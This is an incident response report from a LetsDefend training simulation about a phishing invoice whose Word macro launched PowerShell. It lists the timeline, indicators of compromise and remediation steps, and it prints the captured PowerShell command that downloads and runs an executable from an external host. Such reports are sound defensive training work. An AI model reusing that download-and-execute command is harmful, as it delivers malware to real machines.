# Incident Response Report: SOC205 - Malicious Macro Execution

**Date:** Dec 16, 2025, **Analyst:** Steven Razanajatovo, **Platform:** LetsDefend (Simulation), **Alert ID:** SOC231, **Severity:** Medium

## Executive Summary
On February 28, 2024, the Security Operations Center (SOC) received an alert (SOC205) regarding the execution of a malicious macro on the endpoint "**Jayne**" (172.16.17.198).

Investigation confirmed that the user received a phishing email masquerading as a membership invoice. Upon opening the attached Word document, a malicious VBA macro executed a PowerShell script which attempted to download and execute a secondary payload (**MESSBOX.EXE**) from an external Command and Control (C2) domain. The incident was detected by EDR solutions. The host was investigated, and indicators of compromise (IOCs) were gathered for blocking.

## Incident Overview
- **Alert Rule:** SOC205 - Malicious Macro has been executed
- **Event Time:** Feb 28, 2024, 08:42 AM
- **Hostname:** Jayne
- **IP Address:** 172.16.17.198
- **Trigger File:** edit1-invoice.docm

## Investigation Timeline & Analysis
### Initial Detection & Static Analysis
The alert was triggered by the creation/execution of **edit1-invoice.docm** in the user's Downloads folder.
- **File Hash (SHA256):** 1a819d18c9a9de4f81829c4cd55a17f767443c22f9b30ca953866827e5d96fb0
- **Analysis:** A hash lookup on VirusTotal returned a score of **34/66**, with multiple vendors flagging the file as **VBA:Trojan**. This confirmed the file contained malicious Visual Basic code.

### Delivery Vector (Phishing Analysis)
Log analysis confirmed the entry point was a phishing email.
- **Sender**: jake.admin@cybercommunity.info
- **Recipient**: jayne@letsdefend.io
- **Subkect:** "February Membership Fee"
- **Timestamp:** Feb 28, 2024, 08:12 AM
- **Attachment:** edit1-invoice.docm.zip

### Execution & Process Analysis
The user extracted and opened the malicious document roughly 30 minutes after receipt.

1. **08:41 AM:** User clicked the attachment; **edit1-invoice.docm.zip** was saved to Downloads.

2. **08:42 AM:** The document was opened via **WINWORD.EXE**.

3. **Command Execution:** The malicious macro spawned a PowerShell process with the following command line:
```
POWERSHELL (NEW-OBJECT SYSTEM.NET.WEBCLIENT).DOWNLOADFILE('HTTP://WWW.GREYHATHACKER.NET/TOOLS/MESSBOX.EXE','MESS.EXE');START-PROCESS 'MESS.EXE'
```
This command attempted to download a payload named **MESSBOX.EXE** from **greyhathacker.net**, rename it to **MESS.EXE**, and immediately execute it.

### Network Connections
Traffic analysis identified communication with a known malicious domain.

- **C2 Domain:** greyhathacker.net

- **C2 IP:** 92.204.221.16 (Flagged as malicious 1/96 in threat intel).

- **Other Observed IPs:** 151.101.64.84, 2.20.148.89, 173.222.106.187 (Likely background traffic or CDN, but noted for context).

## Indicators of Compromise (IOCs)
The following artifacts were identified and should be added to the organization's blocklists.
| Type  |  Value |
|---|---|
| Sender Email  | jake.admin@cybercommunity.info  |
| Domain  | www.greyhathacker.net  |
| URL  |  http://www.greyhathacker.net/tools/messbox.exe |
|  IP Address | 92.204.221.16  |

## Containment & Remediation
- **Action Taken:** The alert indicated that the AV/EDR solution **"Detected"** the threat.

- **Isolation:** The host Jayne was isolated from the network to prevent lateral movement (Simulation Standard Procedure).

- **Cleanup:** The malicious file edit1-invoice.docm and the downloaded payload MESS.EXE were removed from the system.

- **Blocking:** The sender email and C2 domain were blocked at the email gateway and firewall level, respectively.

## Recommendations & Lessons Learned
To prevent recurrence of this specific attack vector:

1. **Disable Macros:** Enforce Group Policy Objects (GPO) to block macros in Office files downloaded from the internet ("Mark of the Web").

2. **User Awareness:** Conduct targeted phishing training for the user regarding verifying invoices and inspecting sender addresses (**cybercommunity.info** is an external domain).

3. **PowerShell Restrictions:** Enforce Constrained Language Mode or sign PowerShell scripts to prevent arbitrary code execution from Office products.